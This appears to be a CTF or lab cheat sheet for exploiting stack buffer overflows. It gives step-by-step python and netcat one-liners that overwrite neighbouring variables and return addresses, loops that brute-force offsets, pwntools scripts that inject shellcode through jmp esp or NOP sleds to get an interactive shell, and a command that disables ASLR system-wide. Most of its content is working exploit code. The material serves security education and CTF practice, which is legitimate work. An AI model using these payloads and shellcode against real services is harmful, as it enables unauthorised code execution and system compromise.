# Buffer Overflow

## Goal
Input longer than its buffer overwrites what sits after it: a neighbour variable, or the function's return address.

## New to this? Read once (2 minutes)
A program keeps what you type in a fixed-size box called a **buffer** (`char buf[32]` = room for 32 characters). Some input functions never check the size (`gets`, `strcpy` …). Type more than fits and the extra characters spill into whatever sits next in memory:
```text
[ buf: 32 bytes ][ other variables ][ saved pointer ][ RETURN ADDRESS ]
  you type here  →  →  →  the extra characters land here  →  →  →  →
```
- spill into **another variable** → you decide its value → sections A, B
- spill into the **return address** (= "where to continue when this function ends") → you decide which code runs next → aim it at the function that prints the flag (C, D) or at code you sent yourself (E)

Every attack below is ONE line you send, built from two things you must find first:

| Word | Meaning | Where it comes from |
|---|---|---|
| **offset** (filler) | how many junk characters (`A`) before the thing you want to overwrite | buffer size in the source, or try lengths in a loop |
| **address** | where a function sits in memory, written like `0x8049196` | printed by the service, or read from the binary with `nm` / `objdump` |
| **value** | what a variable must become (`0xcafebabe`, `"letmein"`) | the `if (…)` in the source |
| **payload** | the exact bytes you send = filler + address (or value) | you build it with the python one-liner |
| **little-endian** | numbers are stored with their bytes reversed: `0x8049196` → `\x96\x91\x04\x08` | `struct.pack("<I", 0x8049196)` reverses it for you |
| **32 / 64-bit** | an address is 4 bytes (`<I`) or 8 bytes (`<Q`) | `file ./chall` |

It worked when the reply contains the flag or text a normal run never shows. It did NOT work when you see the usual goodbye line, nothing, or "Segmentation fault" (= right idea, wrong offset or address).

**Fast path (toolkit)** — run from the folder that contains `bof-scripts/`
```bash
python3 bof-scripts/go.py $IP $PORT ./chall chall.c paper.txt                       # front door: give what you have, any order; none is fine. paper.txt = what the Q says
python3 bof-scripts/solve.py $IP $PORT --binary ./chall --source ./chall.c          # look only (no exploit sent)
python3 bof-scripts/solve.py $IP $PORT --binary ./chall --source ./chall.c --run    # same as go.py, flags typed out.  Help: bof-scripts/RUNBOOK.md
ctf --pwn $IP:$PORT --binary ./chall --src chall.c                                  # 2nd door (classmate's kit). Menu in front of the bug → this one first
```
Run these FIRST, before reading anything else. Flag printed → done. Still running after ~3 minutes, or it ends with "NO FLAG" → by hand below (its last lines say what it found: keep the offset and addresses it printed). All scripts: [15_scripts](15_scripts.md).

**Checklist**
- [ ] `nc $IP $PORT` once → copy every address / number it prints
- [ ] source read: which input call overflows? what makes the flag print?
- [ ] 32 or 64-bit? `file ./chall` (no binary: addresses like `0x80491xx` = 32-bit · `0x4011xx` / `0x7ff…` = 64-bit)
- [ ] payload sent → flag? no → change filler length (never assume the first guess)

# Do this, in order (by hand)
```bash
export IP=<host> PORT=<port>                 # 1. once per terminal tab; every line below uses them
nc $IP $PORT                                 # 2. connect once, type something short, look. COPY every address / number it prints. Ctrl+C to leave
file ./chall                                 # 3. given a binary? "ELF 32-bit" or "ELF 64-bit" · "statically linked" or "dynamically linked"
grep -nE 'gets|strcpy|scanf|read\(|fgets|char .*\[|if *\(|strcmp|fopen|system' chall.c     # 4. given the source? the lines that matter, with line numbers
```
5. In the source find two things: **(a) where your input is read** (the unsafe read, list under the table) and **(b) what makes the flag print** (an `if` on a variable? a function nobody calls?).
6. Match (b) to the table in Step 0 → go to that section → put YOUR numbers into its one-liner → send.
7. No flag → Helpline at the bottom (most often: wrong filler length → use the loop in the same section).

# Step 0: read the source → pick the shape
| In the source | Shape | Go |
|---|---|---|
| unsafe read into `a`, then `strcmp(b,"word")` / `if(b…)` on ANOTHER variable | overwrite neighbour, text | A |
| `if (x == 0x…)` · struct with buffer then number | overwrite neighbour, number | B |
| `win()` / flag function that is never called | return address → win | C (32-bit) · D (64-bit) |
| no win; stack executable; `jmp esp` or buffer address printed | shellcode | E |
| menu / question BEFORE the vulnerable input | same shapes, answer the menu first | G |
| `printf(buf)` with your input | not BOF | [13_fmt](13_fmt.md) |

Unsafe reads: `gets(buf)` · `strcpy(buf,x)` · `scanf("%s",buf)` · `read(0,buf,N)` / `fgets(buf,N,…)` where N > size of buf.

# A. Neighbour text (`strcmp`)
**What is happening:** you type into one variable, but the program checks a DIFFERENT one. They sit side by side, so typing past the end of the first writes into the second. Fill the first completely, then type the text the check wants.
```c
char name[16]; char secret[16]="xxxx"; gets(name); if (strcmp(secret,"letmein")==0) win();
```
```bash
python3 -c 'print("A"*16 + "letmein")' | nc -w3 $IP $PORT        # filler = size of the buffer you type into, then the wanted text
for n in $(seq 8 64); do echo "$n: $(python3 -c "print('A'*$n + 'letmein')" | nc -w3 $IP $PORT | tail -2 | tr '\n' ' ')"; done   # filler unknown → the odd line wins
```

# B. Neighbour number (`== 0xcafebabe`)
**What is happening:** same as A, but the neighbour is a number, so the bytes you send after the filler must be that number, reversed.
Numbers sit in memory little-endian = byte pairs reversed: `0xcafebabe` → `\xbe\xba\xfe\xca`. `struct.pack("<I", …)` does the reversing.
```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*32 + struct.pack("<I",0xcafebabe) + b"\n")' | nc -w3 $IP $PORT    # 32 = buffer size in source
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\xbe\xba\xfe\xca" + b"\n")' | nc -w3 $IP $PORT                    # same, bytes typed by hand
```
Filler unknown → loop it as in A. Check is only "changed" (`!= 0x…`) → any overflow does it: `python3 -c 'print("A"*64)' | nc -w3 $IP $PORT`

# C. Return address → `win()`, 32-bit
**What is happening:** the program contains a function that prints the flag (`win`, or any other name) but never calls it. When the function that read your input finishes, it jumps to its saved return address. Your overflow replaces that address with the flag function's → the program "returns" into it and prints the flag.
You need two numbers: the **address** of the flag function (step 1) and the **offset** = how many `A` come before the return address (step 2). Then step 3 sends them.
Payload = `"A" × offset` + win address as 4 reversed bytes (`struct.pack("<I", addr)`).

**1. win address**: printed by the service · `nm ./chall | grep -i win` · `objdump -d ./chall | grep '<win>'` · gdb `p win`

Flag function has another name → list all functions and pick the one `main` never calls that opens the flag file: `objdump -d ./chall | grep '>:$'` · its address is the number at the start of that line.

**2. offset** = bytes before the return address. Any ONE way (a "pattern" is a long string in which every 4 characters are unique, so the 4 that land in the return address tell you the position):
```bash
# a) service prints the return address it will jump to → send a pattern, look the value up
msf-pattern_create -l 200 | nc -w3 $IP $PORT             # note the 0x… it prints
msf-pattern_offset -l 200 -q 0x35624134                  # → Exact match at offset 44
# b) same without pattern tools: grow n until the printed address = 0x42424242 (BBBB)
for n in $(seq 16 4 100); do echo "$n $(python3 -c "print('A'*$n+'BBBB')" | nc -w3 $IP $PORT | grep -oE '0x[0-9a-f]{6,}' | tail -1)"; done
# c) have the binary: crash it in gdb
msf-pattern_create -l 200 > pat.txt
gdb -q -batch -ex 'run < pat.txt' -ex 'info registers eip' ./chall         # eip value → msf-pattern_offset as in a)
# d) have the binary: read it off the disassembly
objdump -d ./chall | grep -B4 -E 'call.*<(gets|read|strcpy|fgets)@plt>'    # lea just above the UNSAFE read: "lea -0x28(%ebp)" → offset = 0x28 + 4 = 44  (64-bit: +8)
# e) nothing to go on: try them all (usual: size+4 … size+16, e.g. buf[32] → 36/40/44)
for n in $(seq 8 4 200); do echo "$n: $(python3 -c "import sys,struct; sys.stdout.buffer.write(b'A'*$n + struct.pack('<I',0x8049196) + b'\n')" | nc -w3 $IP $PORT | tail -2 | tr '\n' ' ')"; done
```
**3. fire**
```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*44 + struct.pack("<I",0x8049196) + b"\n")' | nc -w3 $IP $PORT
```
By hand instead: pad to 8 hex digits, reverse the pairs: `0x8049196` = `08 04 91 96` → `\x96\x91\x04\x08` → `printf 'AAAA…\x96\x91\x04\x08\n' | nc …`

# D. 64-bit differences
**What is happening:** exactly C, on a 64-bit program. Only the sizes change.
- address = 8 bytes → `struct.pack("<Q", addr)` (Q, not I): `0x401186` → `\x86\x11\x40\x00\x00\x00\x00\x00`
- offset usually buffer size + 8 (+ padding). In gdb the pattern is NOT in rip → read the stack top:
```bash
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<Q",0x401186) + b"\n")' | nc -w3 $IP $PORT
gdb -q -batch -ex 'run < pat.txt' -ex 'x/gx $rsp' ./chall          # value → msf-pattern_offset -l 200 -q 0x<value>
```
- right offset + address but it crashes inside win (stack alignment) → jump to `win+1` (skips `push rbp`), or put a `ret` gadget first: `ROPgadget --binary ./chall | grep ': ret$'` → payload = filler + ret addr (8 bytes) + win addr (8 bytes)

# E. Shellcode (no win; `pwn checksec ./chall` says NX disabled / Stack Executable / RWX)
**What is happening:** there is no flag function to jump to, so you send your own tiny program ("shellcode" = machine code that starts a shell) inside the input and aim the return address at it. `jmp esp` is an instruction already in the binary that means "run whatever comes right after the return address", which is where your shellcode sits. You end up with a shell: type `cat flag.txt`.
`jmp esp` present (`ROPgadget --binary ./chall | grep 'jmp esp'` or `objdump -d ./chall | grep -B3 'jmp.*%esp'`) → save as `x.py`, run `python3 x.py`:
```python
from pwn import *
context.arch = 'i386'                                  # 64-bit: 'amd64', p64, jmp rsp
io = remote("IP", PORT)                                # local test first: process("./chall")
jmp_esp = 0x08049199
payload = b"A"*140 + p32(jmp_esp) + b"\x90"*16 + asm(shellcraft.sh())      # 140 = offset (find as in C)
io.send(payload)                                       # read() → send ; gets()/fgets() → sendline
sleep(1)                                               # let the overflow finish before typing
io.interactive()                                       # then: cat flag.txt ; find / -name '*flag*' 2>/dev/null
```
No `jmp esp` but the service prints the buffer address → shellcode goes INSIDE the buffer:
`payload = b"\x90"*(offset-len(sc)-40) + sc + b"A"*40 + p32(buffer_addr)` with `sc = asm(shellcraft.sh())` (the 40 filler bytes stop the shellcode overwriting itself).
Toolkit does both + fixes a shifted remote build: `python3 bof-scripts/ret2shell.py --binary ./chall --host $IP --port $PORT`

# F. Lab-style local program (input = command-line argument)
**What is happening:** the lab-sheet version: the program runs on YOUR machine and takes the input as an argument (`./prog AAAA`) instead of over the network. Same ideas, but you can watch it in gdb.
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space                 # ASLR off (per run instead: setarch -R ./prog ARG)
for n in $(seq 1 400); do ./prog $(python3 -c "print('A'*$n)") >/dev/null 2>&1 || { echo "first crash at $n"; break; }; done   # minimum length that crashes
gdb -q ./prog
#  disas main → address of the instruction right after strcpy → b *0x<addr> → run AAAA
#  x/100xb $esp → the 0x41 bytes = start of buf; another variable's bytes nearby → count the distance between them
./prog $(python3 -c 'print("A"*8 + "2")')                              # change a neighbour variable: filler × distance + new value
```
Shellcode into the buffer (`x.py`; offset from pattern as in C, buffer address from gdb):
```python
from pwn import *
context.arch = 'i386'; context.log_level = 'error'
OFFSET, BUF = 264, 0xffffc8f4
sc = asm(shellcraft.sh())
for d in range(0, 600, 50):                    # outside gdb the stack sits higher → walk up through the NOPs
    io = process(["./prog", b"\x90"*(OFFSET-len(sc)-40) + sc + b"A"*40 + p32(BUF+d)], aslr=False)
    try:
        io.sendline(b"echo OK")
        if b"OK" in io.recvrepeat(0.5): io.interactive(); break
    except EOFError: pass
    io.close()
```

# G. Menu or question in front of the overflow
**What is happening:** the program asks something first (a menu number, a name) and only then reads the input that overflows. Nothing new: answer the first question on its own line, then send the same payload as before.
The payload is the same as A–E; the menu answer goes FIRST, on its own line. Walk the menu once by hand and note what each option does.
```bash
nc $IP $PORT                                           # try every option: which one PRINTS an address? which one asks for free text?
printf '3\n4\n' | nc -w3 $IP $PORT                     # e.g. option 3 prints an address, 4 quits
for o in 1 2 3 4; do echo "$o: $(printf "$o\n%s\n" "$(python3 -c "print('A'*300)")" | nc -w3 $IP $PORT | tail -1)"; done   # the option that shows 0x41414141 / dies / goes silent takes the overflow
python3 -c 'import sys,struct; sys.stdout.buffer.write(b"2\n" + b"A"*52 + struct.pack("<I",0x<address>) + b"\n")' | nc -w3 $IP $PORT   # here: option 2 takes the input, offset 52, then the address
```
- offset unknown → loop it (as C.2 e) with the menu line kept in front: `b"2\n" + b"A"*$n + …`
- the function is not called `win` → any function nothing calls that opens the flag file (any name: `unlock`, `secret`, `admin` …): `objdump -d ./chall | grep '>:$'`, compare with what `main` calls.
- name asked first (`Name:`) → send a harmless line first the same way: `b"bob\n" + payload`.
- address printed only AFTER a choice, different every connection (PIE) → must be ONE connection: pwntools `io.sendline(b"3")` → read address → `io.sendline(b"2")` → payload.
- scripts: `ctf --pwn $IP:$PORT --binary ./chall` and `go.py` (given the binary) both handle this. Without the binary `go.py` cannot find an address that is only printed behind a menu option → read it by hand (line above) and put it in `paper.txt`.

# Protections (`pwn checksec ./chall`)
| Says | Means |
|---|---|
| No canary found | overflow reaches the return address → C / D possible |
| Canary found | "stack smashing detected" on return → C / D blocked unless canary leaked; A / B still work |
| NX enabled | stack not executable → no shellcode, need `win()` |
| NX disabled / Stack Executable / RWX | E possible |
| No PIE (0x8048000 / 0x400000) | addresses fixed → use those from the binary |
| PIE enabled | addresses move each run → only addresses the service prints are valid |
| ASLR (system setting, not in checksec) | stack / library addresses random per run → a hard-coded stack address fails; labs switch it off so addresses stay the same |

Compile flags: `-m32` 32-bit · `-fno-stack-protector` no canary · `-z execstack` stack executable (NX off) · `-no-pie` fixed addresses · `-mpreferred-stack-boundary=2` 4-byte stack alignment (simple layout).

# gdb mini
```text
gdb -q ./chall        disas vuln            b *0x080491a3        run < in.txt   (stdin)   |   run ARG   (argv)
x/100xb $esp          info registers eip    p win                x/s 0x<addr>             c   ni   q
```

### Helpline
```bash
# no effect → filler length wrong (brute it) or Enter missing: gets/fgets/scanf need \n at the end, read() does not.
# works locally, not remote → server build differs: trust addresses the SERVICE prints; try address ±0x10; bof-scripts/verify.py.
# bad bytes: 0x0a ends gets/fgets input · 0x00 ends strcpy · space/tab end scanf("%s") → an address containing one can't be sent that way.
# python3 print() corrupts bytes ≥ 0x80 → sys.stdout.buffer.write(b"…").
# overflow sits in main() of a new 32-bit build: return address not reachable the simple way → A / B still fine.
# compile the given source for local tries: gcc -m32 -std=gnu99 -fno-stack-protector -no-pie -z execstack x.c -o x
#   (-std=gnu99 or gets() won't compile; add -mpreferred-stack-boundary=2 if the overflow is in main; layout can differ from the server → server decides)
# local run needs the file named in fopen("…"): echo test > flag.txt
# shell obtained: cat flag.txt ; ls -la ; find / -name '*flag*' 2>/dev/null
```
